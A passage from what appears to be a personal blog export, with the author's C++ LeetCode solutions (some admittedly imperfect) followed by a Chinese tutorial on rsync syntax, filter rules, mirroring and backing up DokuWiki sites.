[7,0,8]Explanation: 342 + 465 = 807.\n\nExample 2:\nInput: l1 = [0], l2 = [0]Output: [0]\n\nExample 3:\nInput: l1 = [9,9,9,9,9,9,9], l2 = [9,9,9,9]Output: [8,9,9,9,0,0,0,1]\n\nConstraints:\n\nThe number of nodes in each linked list is in the range [1, 100].\n0 &lt;= Node.val &lt;= 9\nIt is guaranteed that the list represents a number that does not have leading zeros.\n\nSolution/** * Definition for singly-linked list. * struct ListNode &#123; *     int val; *     ListNode *next; *     ListNode() : val(0), next(nullptr) &#123;&#125; *     ListNode(int x) : val(x), next(nullptr) &#123;&#125; *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125; * &#125;; */class Solution &#123;public:    ListNode* addTwoNumbers(ListNode* l1, ListNode* l2) &#123;        ListNode *l1p = l1;        ListNode *l2p = l2;        ListNode *out = new ListNode;        ListNode *outp = out;        outp-&gt;next = nullptr;                int over = 0; //溢出位        do &#123;            int l1v = 0, l2v = 0;            bool is_continue = false;            if(l1p) &#123;                l1v = l1p-&gt;val;                l1p = l1p-&gt;next;            &#125;else &#123;                l1v = 0;            &#125;                        if(l2p) &#123;                l2v = l2p-&gt;val;                l2p = l2p-&gt;next;            &#125;else &#123;                l2v = 0;            &#125;                        outp-&gt;val = (l1v + l2v + over) % 10; //加法运算            over = (l1v + l2v + over) / 10; // 获取进位                        is_continue = l1p || l2p; // 是否循环                        if(is_continue) &#123;                outp-&gt;next = new ListNode;                outp = outp-&gt;next;                outp-&gt;next = nullptr;                            &#125;else &#123;                if(over) &#123; //进位不为0,则加入如进位到最高位。                    outp-&gt;next = new ListNode;                    outp = outp-&gt;next;                    outp-&gt;val = over;                    outp-&gt;next = nullptr;                &#125;                break;            &#125;        &#125;while(true);                return out;    &#125;&#125;;\n\n\n\nRuntime: 52 ms\nMemory Usage: 71.4 MB\n3. Longest Substring Without Repeating CharactersIntro\nGiven a string s, find the length of the longest substring without repeating characters.\nExample 1:\nInput: s = &quot;abcabcbb&quot;Output: 3Explanation: The answer is &quot;abc&quot;, with the length of 3.\n\nExample 2:\nInput: s = &quot;bbbbb&quot;Output: 1Explanation: The answer is &quot;b&quot;, with the length of 1.\n\nExample 3:\nInput: s = &quot;pwwkew&quot;Output: 3Explanation: The answer is &quot;wke&quot;, with the length of 3.Notice that the answer must be a substring, &quot;pwke&quot; is a subsequence and not a substring.\n\nExample 4:\nInput: s = &quot;&quot;Output: 0\n\nConstraints:\n\n0 &lt;= s.length &lt;= 5 * 104\ns consists of English letters, digits, symbols and spaces.\n\n\n\nSolutionclass Solution &#123;public:    int lengthOfLongestSubstring(string s) &#123;        int ch_map[127] = &#123;0&#125;;        int out = 0;        int sum = 0;        int length = s.length();         for(int i = 0; i &lt; length; i++) &#123;                        for(int j = i; j &lt; length; j++) &#123;                if(ch_map[s[j]] == 1) &#123; // 重复.                    // 该子字符串长度sum                    if(sum &gt; out) out = sum;                     // 对ch_map清0                    memset(ch_map, 0, sizeof(ch_map));                    sum = 0;                    break;                &#125; else &#123;                    ch_map[s[j]] = 1;                    sum += 1;                &#125;            &#125;        &#125;                if(sum &gt; out) out = sum;                return out;    &#125;&#125;;\n\nRuntime: 20 ms\nMemory Usage: 6.9 MB\n7. Reverse IntegerIntroGiven a signed 32-bit integer x, return x with its digits reversed. If reversing x causes the value to go outside the signed 32-bit integer range [-231, 231 - 1], then return 0.\nAssume the environment does not allow you to store 64-bit integers (signed or unsigned).\nExample 1:\nInput: x = 123Output: 321\n\nExample 2:\nInput: x = -123Output: -321\n\nExample 3:\nInput: x = 120Output: 21\n\nConstraints:\n\n-231 &lt;= x &lt;= 231 - 1\n\nSolutionclass Solution &#123;public:\tint reverse(int x) &#123;\t\tint _x = 0;\t\tbool if_minus = false;\t\tif(x == 0x80000000) return 0;\t\tif(x == 0) return 0;\t\tif(x &lt; 0) &#123;\t\t\tif_minus = true;\t\t\t_x = (0 - x);\t\t&#125;else _x = x;\t\tint times = 0;\t\t\tunsigned int num = _x;\t\t\tlong long result = 0;\t\tunsigned long long uresult = 0;\t\tdo &#123;\t\ttimes = num % 10;\t\tresult *= 10;\t\tresult += times;\t\t&#125;while(num /= 10);\t\turesult = (unsigned long long)result;\t\tif(uresult &gt; 0xFFFFFFFF) &#123;\t\t\treturn 0;\t\t&#125;else if(0 - result &gt; 0xFFFFFFFF) &#123;\t\t\treturn 0;\t\t&#125;\t\tif(if_minus) &#123;\t\t\tif(if_minus == ((int)(0 - result) &gt; 0)) return 0;\t\t \telse return (int)(0 - result);\t\t&#125;else &#123;\t\t\tif(if_minus == ((int)(result) &gt; 0)) return 0;\t\t \telse return (int)result;\t\t&#125;\t&#125;\t&#125;;\n\nRuntime: 3 ms\nMemory Usage: 6 MB\n9. Palindrome NumberIntroeasy\nGiven an integer x, return true if x is palindrome integer.\nAn integer is a palindrome when it reads the same backward as forward.\n\nFor example, 121 is a palindrome while 123 is not.\n\nExample 1:\nInput: x = 121Output: trueExplanation: 121 reads as 121 from left to right and from right to left.\n\nExample 2:\nInput: x = -121Output: falseExplanation: From left to right, it reads -121. From right to left, it becomes 121-. Therefore it is not a palindrome.\n\nExample 3:\nInput: x = 10Output: falseExplanation: Reads 01 from right to left. Therefore it is not a palindrome.\n\nConstraints:\n\n-231 &lt;= x &lt;= 231 - 1\n\nFollow up: Could you solve it without converting the integer to a string?\nSolutionclass Solution &#123;public:    bool isPalindrome(int x) &#123;\tint num_arr[16] = &#123;0&#125;;\t\tint len = 0;\tint num = x;\tif(x &lt; 0) return false;\tdo &#123;\t\tnum_arr[len] = num % 10;\t\t++ len;\t&#125;while(num /= 10);\t\tfor(int j = 0; j &lt; len; j++)&#123;\t\tif(num_arr[j] != num_arr[len - j -1])\t\t\treturn false;\t&#125;\t\treturn true;    &#125;&#125;;\n\nRuntime: 22 ms\nMemory Usage: 6 MB\n13. Roman to IntegerIntroeasy\nRoman numerals are represented by seven different symbols: I, V, X, L, C, D and M.\nSymbol       ValueI             1V             5X             10L             50C             100D             500M             1000\n\nFor example, 2 is written as II in Roman numeral, just two ones added together. 12 is written as XII, which is simply X + II. The number 27 is written as XXVII, which is XX + V + II.\nRoman numerals are usually written largest to smallest from left to right. However, the numeral for four is not IIII. Instead, the number four is written as IV. Because the one is before the five we subtract it making four. The same principle applies to the number nine, which is written as IX. There are six instances where subtraction is used:\n\nI can be placed before V (5) and X (10) to make 4 and 9. \nX can be placed before L (50) and C (100) to make 40 and 90. \nC can be placed before D (500) and M (1000) to make 400 and 900.\n\nGiven a roman numeral, convert it to an integer.\nExample 1:\nInput: s = &quot;III&quot;Output: 3Explanation: III = 3.\n\nExample 2:\nInput: s = &quot;LVIII&quot;Output: 58Explanation: L = 50, V= 5, III = 3.\n\nExample 3:\nInput: s = &quot;MCMXCIV&quot;Output: 1994Explanation: M = 1000, CM = 900, XC = 90 and IV = 4.\n\nConstraints:\n\n1 &lt;= s.length &lt;= 15\ns contains only the characters (&#39;I&#39;, &#39;V&#39;, &#39;X&#39;, &#39;L&#39;, &#39;C&#39;, &#39;D&#39;, &#39;M&#39;).\nIt is guaranteed that s is a valid roman numeral in the range [1, 3999].\n\nSolutionclass Solution &#123;public:    int romanToInt(string s) &#123;        map&lt;char, int&gt; table = &#123;            &#123;&#x27;I&#x27;, 1&#125;,            &#123;&#x27;V&#x27;, 5&#125;,            &#123;&#x27;X&#x27;, 10&#125;,            &#123;&#x27;L&#x27;, 50&#125;,            &#123;&#x27;C&#x27;, 100&#125;,            &#123;&#x27;D&#x27;, 500&#125;,            &#123;&#x27;M&#x27;, 1000&#125;        &#125;;        int ans = 0;        int len = s.size();        for(int i = 0; i &lt; len-1; i++)&#123;            if(table[s[i]] &gt;= table[s[i+1]])&#123;                ans += table[s[i]];            &#125;else&#123;                ans += -table[s[i]];            &#125;        &#125;        ans += table[s[len-1]];        return ans;    &#125;&#125;;\n\nRuntime: 10 ms\nMemory Usage: 8.3 MB\n14Introeasy\nWrite a function to find the longest common prefix string amongst an array of strings.\nIf there is no common prefix, return an empty string &quot;&quot;.\nExample 1:\nInput: strs = [&quot;flower&quot;,&quot;flow&quot;,&quot;flight&quot;]Output: &quot;fl&quot;\n\nExample 2:\nInput: strs = [&quot;dog&quot;,&quot;racecar&quot;,&quot;car&quot;]Output: &quot;&quot;Explanation: There is no common prefix among the input strings.\n\nConstraints:\n\n1 &lt;= strs.length &lt;= 200\n0 &lt;= strs[i].length &lt;= 200\nstrs[i] consists of only lowercase English letters.\n\nSolution部分还出错。\nclass Solution &#123;public:    string longestCommonPrefix(vector&lt;string&gt;&amp; strs) &#123;\tstring result(&quot;&quot;);\tvector&lt;int&gt; str_len_arr;\tint i = 0;\tint str_n = strs.size();\tif (str_n == 0) return result;\tfor(i = 0; i &lt; str_n; i++) &#123;\t\tstr_len_arr.push_back(strs[i].length());\t&#125;\tfor(i = 0; i &lt; str_n - 1; i++) &#123;\t\tif(str_len_arr[i] &gt; str_len_arr[i + 1]) &#123;\t\t\tstr_len_arr[i] += str_len_arr[i + 1];\t\t\tstr_len_arr[i + 1] = str_len_arr[i] - str_len_arr[i + 1];\t\t\tstr_len_arr[i] = str_len_arr[i] - str_len_arr[i + 1];\t\t&#125;\t&#125;\tint min = str_len_arr[0];\ti = 0;\twhile(true) &#123;\t\tfor(int j = 1; j &lt; str_n; j++) &#123;\t\t\tif(strs[j][i] != strs[0][i]) &#123;\t\t\t\tgoto NO;\t\t\t&#125;\t\t&#125;//\t\tcout &lt;&lt; &quot;debug&quot; &lt;&lt; i &lt;&lt; endl;\t\tresult += strs[0][i];\t\ti++;\t\tif(i &gt;= min) break;\t&#125;\tNO:\t\treturn result;    &#125;&#125;;\n\n\n\n\n\n\n\n20. Valid ParenthesesSolutionclass Solution &#123;public:    bool isValid(string s) &#123;        int len = s.length();\tint j = 0;\tchar ch = 0;\tfor(int i = 0; i &lt; len; ) &#123;\t\tswitch(s[i]) &#123;\t\tcase &#x27;&#123;&#x27;: &#123;\t\t\tif(i + 1 &gt;= len)&#123;\t\t\t\treturn false;\t\t\t&#125;\t\t\tfor(j = i + 1; j &lt; len; ) &#123;\t\t\t\tif(s[j] == &#x27; &#x27; )&#123;\t\t\t\t\tj++;\t\t\t\t&#125; else if (s[j] == &#x27;&#125;&#x27;) &#123;\t\t\t\t\ts[i] = &#x27; &#x27;;\t\t\t\t\ts[j] = &#x27; &#x27;;\t\t\t\t\twhile(i &gt; 0) &#123;\t\t\t\t\t\tif(s[i] == &#x27;&#123;&#x27; || s[i] == &#x27;[&#x27; || s[i] == &#x27;(&#x27;) break;\t\t\t\t\t\telse i --;\t\t\t\t\t&#125;\t\t\t\t\tbreak;\t\t\t\t&#125;else &#123;\t\t\t\t\ti ++;\t\t\t\t\tbreak;\t\t\t\t&#125;\t\t\t\tif(j &gt;= len) return false;\t\t\t&#125;\t\t&#125; break;\t\tcase &#x27;[&#x27;: &#123;\t\t\tif(i + 1 &gt;= len)&#123;\t\t\t\treturn false;\t\t\t&#125;\t\t\tfor(j = i + 1; j &lt; len; ) &#123;\t\t\t\tif(s[j] == &#x27; &#x27; )&#123;\t\t\t\t\tj++;\t\t\t\t&#125; else if (s[j] == &#x27;]&#x27;) &#123;\t\t\t\t\ts[i] = &#x27; &#x27;;\t\t\t\t\ts[j] = &#x27; &#x27;;\t\t\t\t\twhile(i &gt; 0) &#123;\t\t\t\t\t\tif(s[i] == &#x27;&#123;&#x27; || s[i] == &#x27;[&#x27; || s[i] == &#x27;(&#x27;) break;\t\t\t\t\t\telse i --;\t\t\t\t\t&#125;\t\t\t\t\tbreak;\t\t\t\t&#125;else &#123;\t\t\t\t\ti ++;\t\t\t\t\tbreak;\t\t\t\t&#125;\t\t\t\tif(j &gt;= len) return false;\t\t\t&#125;\t\t&#125; break;\t\tcase &#x27;(&#x27;: &#123;\t\t\tif(i + 1 &gt;= len)&#123;\t\t\t\treturn false;\t\t\t&#125;\t\t\tfor(j = i + 1; j &lt; len; ) &#123;\t\t\t\tif(s[j] == &#x27; &#x27; )&#123;\t\t\t\t\tj++;\t\t\t\t&#125; else if (s[j] == &#x27;)&#x27;) &#123;\t\t\t\t\ts[i] = &#x27; &#x27;;\t\t\t\t\ts[j] = &#x27; &#x27;;\t\t\t\t\twhile(i &gt; 0) &#123;\t\t\t\t\t\tif(s[i] == &#x27;&#123;&#x27; || s[i] == &#x27;[&#x27; || s[i] == &#x27;(&#x27;) break;\t\t\t\t\t\telse i --;\t\t\t\t\t&#125;\t\t\t\t\tbreak;\t\t\t\t&#125;else &#123;\t\t\t\t\ti ++;\t\t\t\t\tbreak;\t\t\t\t&#125;\t\t\t\tif(j &gt;= len) return false;\t\t\t&#125;\t\t&#125; break;\t\tdefault : &#123;\t\t\ti++;\t\t&#125;\t\t&#125;\t&#125;\tfor(int k = 0; k &lt; len; k++) &#123;\t\tif(s[k] != &#x27; &#x27;) return false;\t&#125;\treturn true;\t    &#125;&#125;;\n\nRuntime: 15 ms\nMemory Usage: 6.2 MB\n21. Merge Two Sorted ListsIntroeasy\nYou are given the heads of two sorted linked lists list1 and list2.\nMerge the two lists in a one sorted list. The list should be made by splicing together the nodes of the first two lists.\nReturn the head of the merged linked list.\nExample 1:\n\n\nInput: list1 = [1,2,4], list2 = [1,3,4]Output: [1,1,2,3,4,4]\n\nExample 2:\nInput: list1 = [], list2 = []Output: []\n\nExample 3:\nInput: list1 = [], list2 = [0]Output: [0]\n\nConstraints:\n\nThe number of nodes in both lists is in the range [0, 50].\n-100 &lt;= Node.val &lt;= 100\nBoth list1 and list2 are sorted in non-decreasing order.\n\nSolutionclass Solution &#123;public:    ListNode* mergeTwoLists(ListNode* l1, ListNode* l2) &#123;\tif(l1 == NULL &amp;&amp; l2 == NULL) return NULL;\tif(!l1) return l2;\tif(!l2) return l1;\t\tListNode *ret = l1;\tdo &#123;\tif(l1 -&gt; next != NULL) &#123;\t\tl1 = l1 -&gt; next;\t&#125;\t\t&#125;while(l1 -&gt; next);\tl1 -&gt; next = l2; // merge\tfor(l1 = ret;l1 -&gt; next; l1 = l1 -&gt; next) &#123;\t\tfor(l2 = ret; l2 -&gt; next; l2 = l2 -&gt; next) &#123;\t\t\tif(l2 -&gt; val &gt; l2 -&gt; next -&gt; val) &#123;\t\t\t\tl2 -&gt; val += l2 -&gt; next -&gt; val;\t\t\t\tl2 -&gt; next -&gt; val = l2 -&gt; val - l2 -&gt; next -&gt; val;\t\t\t\tl2 -&gt; val = l2 -&gt; val - l2 -&gt; next -&gt; val;\t\t\t&#125;\t\t&#125;\t&#125;\treturn ret;\t    &#125; &#125;;\n\n","categories":["algorithm"],"tags":["leetcode"]},{"title":"rsync用法详细解释","url":"/2021/07/10/env/rsync/","content":"rsync用法详细解释提要\n\n熟悉 rsync 的功能及其特点\n掌握 rsync 语法及常用选项的功能\n掌握 rsync 命令的三种基本使用方法\n掌握如何筛选 rsync 的传输目标\n掌握使用 rsync 进行镜像和增量备份的方法\n\nrsync 简介rsync（remote synchronize）是一个远程数据同步工具，可通过 LAN&#x2F;WAN 快速同步多台主机之间的文件。也可以使用 rsync 同步本地硬盘中的不同目录。rsync 是用于替代 rcp 的一个工具，rsync 使用所谓的 rsync算法 进行数据同步，这种算法只传送两个文件的不同部分，而不是每次都整份传送，因此速度相当快。 您可以参考 How Rsync Works A Practical Overview 进一步了解 rsync 的运作机制。rsync 的初始作者是 Andrew Tridgell 和 Paul Mackerras，目前由 http://rsync.samba.org 维护。rsync 支持大多数的类 Unix 系统，无论是 Linux、Solaris 还是 BSD上 都经过了良好的测试。 CentOS系统默认就安装了 rsync 软件包。 此外，在 windows 平台下也有相应的版本，如 cwrsync 和DeltaCopy 等。rsync 具有如下的基本特性：\n\n可以镜像保存整个目录树和文件系统\n可以很容易做到保持原来文件的权限、时间、软硬链接等\n无须特殊权限即可安装\n优化的流程，文件传输效率高\n可以使用 rsh、ssh 方式来传输文件，当然也可以通过直接的 socket 连接\n支持匿名传输，以方便进行网站镜象\n\n在使用 rsync 进行远程同步时，可以使用两种方式：远程 Shell 方式（建议使用 ssh，用户验证由 ssh 负责）和 C&#x2F;S 方式（即客户连接远程 rsync 服务器，用户验证由 rsync 服务器负责）。无论本地同步目录还是远程同步数据，首次运行时将会把全部文件拷贝一次，以后再运行时将只拷贝有变化的文件（对于新文件）或文件的变化部分（对于原有文件）。本节重点介绍 rsync 客户命令的使用，有关 rsync 服务器的配置和使用请参见下节。rsync 在首次复制时没有速度优势，速度不如 tar，因此当数据量很大时您可以考虑先使用 tar 进行首次复制，然后再使用 rsync 进行数据同步。\n镜像、备份和归档实施备份的两种情况：\n\n需保留备份历史归档：在备份时保留历史的备份归档，是为了在系统出现错误后能恢复到从前正确的状态。这可以使用完全备份和增量备份来完成。\n可以使用 tar 命令保存归档文件。\n为了提高备份效率，也可以使用 rsync 结合 tar 来完成。\n\n\n无需保留备份历史归档：若无需从历史备份恢复到正确状态，则只备份系统最“新鲜”的状态即可。这可以简单地使用 rsync 同步来完成。此时通常称为镜像。镜像可以分为两种：\n被镜像的目录在各个主机上保持相同的位置。此时一般是为了实施负载均衡而对多个主机进行同步镜像。例如：将主机 A 的 &#x2F;srv&#x2F;www 目录同步到主机 B 的 &#x2F;srv&#x2F;www 目录等。\n被镜像的目录在各个主机上不保持相同的位置。例如：主机 A 和主机 B 都运行着各自的业务，同时又互为镜像备份。此时主机 A 的 &#x2F;srv&#x2F;www 目录同步到主机 B 的 &#x2F;backups&#x2F;hosta&#x2F;www 目录；主机 B 的 &#x2F;srv&#x2F;www 目录同步到主机 A 的 &#x2F;backups&#x2F;hostb&#x2F;www 目录等。\n\n\n\nrsync 命令rsync 是一个功能非常强大的工具，其命令也有很多功能选项。rsync 的命令格式为：\n1）本地使用：rsync [OPTION...] SRC... [DEST]2）通过远程 Shell 使用：拉: rsync [OPTION...] [USER@]HOST:SRC... [DEST]推: rsync [OPTION...] SRC... [USER@]HOST:DEST3）访问 rsync 服务器:拉: rsync [OPTION...] [USER@]HOST::SRC... [DEST]推: rsync [OPTION...] SRC... [USER@]HOST::DEST拉: rsync [OPTION...] rsync://[USER@]HOST[:PORT]/SRC... [DEST]推: rsync [OPTION...] SRC... rsync://[USER@]HOST[:PORT]/DEST\n\n其中：\n\nSRC: 是要复制的源位置\nDEST: 是复制目标位置\n若本地登录用户与远程主机上的用户一致，可以省略 USER@\n使用远程 shell 同步时，主机名与资源之间使用单个冒号“:”作为分隔符\n使用 rsync 服务器同步时，主机名与资源之间使用两个冒号“::”作为分隔符\n当访问 rsync 服务器时也可以使用 rsync:&#x2F;&#x2F; URL\n“拉”复制是指从远程主机复制文件到本地主机\n“推”复制是指从本地主机复制文件到远程主机\n当进行“拉”复制时，若指定一个 SRC 且省略 DEST，则只列出资源而不进行复制\n\n下面列出常用选项：\n\n\n\n选项\n说明\n\n\n\n-a, ––archive\n归档模式，表示以递归方式传输文件，并保持所有文件属性，等价于 -rlptgoD (注意不包括 -H)\n\n\n-r, ––recursive\n对子目录以递归模式处理\n\n\n-l, ––links\n保持符号链接文件\n\n\n-H, ––hard-links\n保持硬链接文件\n\n\n-p, ––perms\n保持文件权限\n\n\n-t, ––times\n保持文件时间信息\n\n\n-g, ––group\n保持文件属组信息\n\n\n-o, ––owner\n保持文件属主信息 (super-user only)\n\n\n-D\n保持设备文件和特殊文件 (super-user only)\n\n\n-z, ––compress\n在传输文件时进行压缩处理\n\n\n––exclude&#x3D;PATTERN\n指定排除一个不需要传输的文件匹配模式\n\n\n––exclude-from&#x3D;FILE\n从 FILE 中读取排除规则\n\n\n––include&#x3D;PATTERN\n指定需要传输的文件匹配模式\n\n\n––include-from&#x3D;FILE\n从 FILE 中读取包含规则\n\n\n––copy-unsafe-links\n拷贝指向SRC路径目录树以外的链接文件\n\n\n––safe-links\n忽略指向SRC路径目录树以外的链接文件（默认）\n\n\n––existing\n仅仅更新那些已经存在于接收端的文件，而不备份那些新创建的文件\n\n\n––ignore-existing\n忽略那些已经存在于接收端的文件，仅备份那些新创建的文件\n\n\n-b, ––backup\n当有变化时，对目标目录中的旧版文件进行备份\n\n\n––backup-dir&#x3D;DIR\n与 -b 结合使用，将备份的文件存到 DIR 目录中\n\n\n––link-dest&#x3D;DIR\n当文件未改变时基于 DIR 创建硬链接文件\n\n\n––delete\n删除那些接收端还有而发送端已经不存在的文件\n\n\n––delete-before\n接收者在传输之前进行删除操作 (默认)\n\n\n––delete-during\n接收者在传输过程中进行删除操作\n\n\n––delete-after\n接收者在传输之后进行删除操作\n\n\n––delete-excluded\n在接收方同时删除被排除的文件\n\n\n-e, ––rsh&#x3D;COMMAND\n指定替代 rsh 的 shell 程序\n\n\n––ignore-errors\n即使出现 I&#x2F;O 错误也进行删除\n\n\n––partial\n保留那些因故没有完全传输的文件，以是加快随后的再次传输\n\n\n––progress\n在传输时显示传输过程\n\n\n-P\n等价于 ––partial ––progress\n\n\n––delay-updates\n将正在更新的文件先保存到一个临时目录（默认为 “.tmp”），待传输完毕再更新目标文件\n\n\n-v, ––verbose\n详细输出模式\n\n\n-q, ––quiet\n精简输出模式\n\n\n-h, ––human-readable\n输出文件大小使用易读的单位（如，K，M等）\n\n\n-n, ––dry-run\n显示哪些文件将被传输\n\n\n––list-only\n仅仅列出文件而不进行复制\n\n\n––rsyncpath&#x3D;PROGRAM\n指定远程服务器上的 rsync 命令所在路径\n\n\n––password-file&#x3D;FILE\n从 FILE 中读取口令，以避免在终端上输入口令，通常在 cron 中连接 rsync 服务器时使用\n\n\n-4, ––ipv4\n使用 IPv4\n\n\n-6, ––ipv6\n使用 IPv6\n\n\n––version\n打印版本信息\n\n\n––help\n显示帮助信息\n\n\n\n若使用普通用户身份运行 rsync 命令，同步后的文件的属主将改变为这个普通用户身份。\n若使用超级用户身份运行 rsync 命令，同步后的文件的属主将保持原来的用户身份。\n\nrsync 的基本使用在本地磁盘同步数据# rsync -a --delete /home /backups# rsync -a --delete /home/ /backups/home.0\n\n在指定复制源时，路径是否有最后的 “&#x2F;” 有不同的含义，例如：\n\n&#x2F;home ： 表示将整个 &#x2F;home 目录复制到目标目录\n&#x2F;home&#x2F; ： 表示将 &#x2F;home 目录中的所有内容复制到目标目录\n\n使用基于 ssh 的 rsync 远程同步数据\n同步静态主机表文件\n\n# 执行“推”复制同步（centos5 是可解析的远程主机名）[root@soho ~]# rsync /etc/hosts centos5:/etc/hosts# 执行“拉”复制同步（soho 是可解析的远程主机名）[root@centos5 ~]# rsync soho:/etc/hosts /etc/hosts\n\n\n同步用户的环境文件\n\n# 执行“推”复制同步[osmond@soho ~]$ rsync ~/.bash* centos5:# 执行“拉”复制同步[osmond@cnetos5 ~]$ rsync soho:~/.bash* .\n\n\n同步站点根目录\n\n# 执行“推”复制同步[osmond@soho ~]$ rsync -avz --delete /var/www root@192.168.0.101:/var/www# 执行“拉”复制同步[osmond@cnetos5 ~]$ rsync -avz --delete root@192.168.0.55:/var/www /var/www\n\n\n使用基于 ssh 的 rsync 同步数据可以使用 -e ssh 参数，当前的 CentOS 默认指定使用 ssh 作为远程Shell。若您在其他系统上执行 rsync 命令，为确保使用 ssh 作为远程 Shell，请添加 -e ssh 参数。\n通常 rsync 命令在后台以 cron 任务形式执行，为了避免从终端上输入口令需要设置 ssh。ssh 的设置方法请参考 安全登录守护进程。\n\n使用 rsync 从远程 rsync 服务器同步数据下面以镜像 CentOS 和 Ubuntu 的软件库为例来说明。您可以到如下站点查找离自己最近的提供 rsync 服务的镜像站点\n\nCentOS — http://www.centos.org/modules/tinycontent/index.php?id=13\nUbuntu — https://launchpad.net/ubuntu/+archivemirrors\n\n然后执行类似如下命令：\nrsync -aqzH --delete --delay-updates \\rsync://mirror.centos.net.cn/centos /var/www/mirror/centosrsync -azH --progress --delete --delay-updates \\rsync://ubuntu.org.cn/ubuntu /var/www/mirror/ubuntu/rsync -azH --progress --delete --delay-updates \\rsync://ubuntu.org.cn/ubuntu-cn /var/www/mirror/ubuntu-cn/\n\n为了每天不断更新，可以安排一个 cron 任务：\n# crontab -e# mirror centos at 0:10AM everyday10 0 * * * rsync -aqzH --delete --delay-updates rsync://mirror.centos.net.cn/centos /var/www/mirror/centos/# mirror ubuntu at 2:10AM everyday10 2 * * * rsync -azH --progress --delete --delay-updates rsync://ubuntu.org.cn/ubuntu /var/www/mirror/ubuntu/# mirror ubuntu-cn at 4:10AM everyday10 4 * * * rsync -azH --progress --delete --delay-updates rsync://ubuntu.org.cn/ubuntu-cn /var/www/mirror/ubuntu-cn/\n\n如果您安装了自己的匿名 rsync 服务器请相应地更改 rsync URL。有关如何配置匿名 rsync 服务器的内容请参见下节。\n筛选 rsync 的传输目标使用 –exclude&#x2F;–include 选项可以使用 ––exclude 选项排除源目录中要传输的文件；同样地，也可以使用 ––include 选项指定要传输的文件。例如：下面的 rsync 命令将 192.168.0.101 主机上的 &#x2F;www 目录（不包含 &#x2F;www&#x2F;logs 和 &#x2F;www&#x2F;conf子目录）复制到本地的 &#x2F;backup&#x2F;www&#x2F; 。\n# rsync -vzrtopg --delete --exclude &quot;logs/&quot; --exclude &quot;conf/&quot; --progress \\backup@192.168.0.101:/www/ /backup/www/\n\n又如：下面的 rsync 命令仅复制目录结构而忽略掉目录中的文件。\n# rsync -av --include &#x27;*/&#x27; --exclude &#x27;*&#x27; \\backup@192.168.0.101:/www/ /backup/www-tree/\n\n选项 ––include 和 ––exclude 都不能使用间隔符。例如：\n--exclude &quot;logs/&quot; --exclude &quot;conf/&quot;\n\n不能写成\n--exclude &quot;logs/ conf/&quot;\n\n使用 –exclude-from&#x2F;–include-from 选项当 include&#x2F;exclude 的规则较复杂时，可以将规则写入规则文件。使用规则文件可以灵活地选择传输哪些文件（include）以及忽略哪些文件（exclude）。\n\n若文件&#x2F;目录在剔除列表中，则忽略传输\n若文件&#x2F;目录在包含列表中，则传输之\n若文件&#x2F;目录未被提及，也传输之\n\n在 rsync 的命令行中使用 ––exclude-from&#x3D;FILE 或 ––include-from&#x3D;FILE 读取规则文件。规则文件 FILE 的书写约定：\n\n每行书写一条规则 RULE\n以 # 或 ; 开始的行为注释行\n\n包含（include）和排除（exclude）规则的语法如下：\n\ninclude PATTERN 或简写为 + PATTERN\nexclude PATTERN 或简写为 - PATTERN\n\nPATTERN 的书写规则如下：\n\n以 &#x2F; 开头：匹配被传输的跟路径上的文件或目录\n以 &#x2F; 结尾：匹配目录而非普通文件、链接文件或设备文件\n使用通配符\n*：匹配非空目录或文件（遇到 &#x2F; 截止）\n**：匹配任何路径（包含 &#x2F; ）\n?：匹配除了 &#x2F; 的任意单个字符\n[：匹配字符集中的任意一个字符，如 [a-z] 或 [[:alpha:]]\n可以使用转义字符 \\ 将上述通配符还原为字符本身含义\n\n下面给出几个使用规则的例子：例1：\n# 不传输所有后缀为 .o 的文件- *.o# 不传输传输根目录下名为 foo 的文件或目录- /foo# 不传输名为 foo 的目录- foo/# 不传输 /foo 目录下的名为 bar 的文件或目录- /foo/bar\n\n例2：\n# 传输所有目录和C语言源文件并禁止传输其他文件+ */+ *.c- *\n\n例3：\n# 仅传输 foo 目录和其下的 bar.c 文件+ foo/+ foo/bar.c- *\n\n将规则写入规则文件之后，如何在命令行上使用它呢？下面给出一个例子：首先将下面的规则存入名为 www-rsync-rules 的文件\n# 不传输 logs 目录- logs/# 不传输后缀为 .tmp 的文件- *.tmp# 传输 Apache 虚拟主机文档目录（/*/ 匹配域名）+ /srv/www/+ /srv/www/*/+ /srv/www/*/htdocs/+ /srv/www/*/htdocs/**# 传输每个用户的 public_html 目录（/*/ 匹配用户名）+ /home/+ /home/*/+ /home/*/public_html/+ /home/*/public_html/**# 禁止传输其他- *\n\n然后即可使用类似如下的 rsync 命令：\nrsync -av --delete --exclude-from=www-rsync-rules / remotehost:/dest/dir\n\nrsync 应用示例使用 rsync 镜像使用 rsync 对目录做镜像实际上就是做无历史归档的完全备份。下面给出一个镜像远程 Web 站点例子。笔者在 dreamhost 上维护了3个 Dokuwiki 站点。为了备份这3个站点笔者使用 rsync 进行镜像。远程站点的目录结构如下：\n~|-- sinosmond.com| `-- dokuwiki|-- smartraining.cn| `-- dokuwiki`-- symfony-project.cn`-- dokuwiki\n\n每个 Dokuwiki 的目录结构如下：\ndokuwiki|-- bin|-- inc|-- conf --- 存放配置文件的目录| |-- acl.auth.php --- 访问控制配置文件 ★| |-- local.php --- 本地配置文件 ★| |-- users.auth.php --- 用户口令文件 ★| `-- ………………|-- data --- 存放数据的目录| |-- attic --- 存放WIKI版本信息 ★| |-- cache --- 存放数据缓存| |-- index --- 存放站内索引| |-- locks --- 存放编辑页面时的锁定文件| |-- media --- 存放图片等 ★| |-- meta --- 存放 meta 以便系统读取这些信息生成页面 ★| `-- pages --- 存放 wiki 页面 ★`-- lib|-- plugins --- 存放插件的目录 ☆|-- tpl --- 存放模版的目录 ☆`-- ………………\n\n为了减少网络流量，只同步标有 ★ 的目录或文件。若在站点运行过程中新安装了插件或更换了模板，也应该同步标有 ☆ 的目录。为此编写如下的规则文件 &#x2F;root&#x2F;bin&#x2F;backup&#x2F;dw-exclude.txt：\n- dokuwiki/bin/- dokuwiki/inc/- dokuwiki/data/cache/- dokuwiki/data/locks/- dokuwiki/data/index/+ dokuwiki/conf/acl.auth.php+ dokuwiki/conf/local.php+ dokuwiki/conf/users.auth.php- dokuwiki/conf/*+ dokuwiki/lib/plugins/# 不同步系统默认安装的插件- dokuwiki/lib/plugins/acl/- dokuwiki/lib/plugins/config/- dokuwiki/lib/plugins/importoldchangelog/- dokuwiki/lib/plugins/importoldindex/- dokuwiki/lib/plugins/info/- dokuwiki/lib/plugins/plugin/- dokuwiki/lib/plugins/revert/- dokuwiki/lib/plugins/usermanager/- dokuwiki/lib/plugins/action.php- 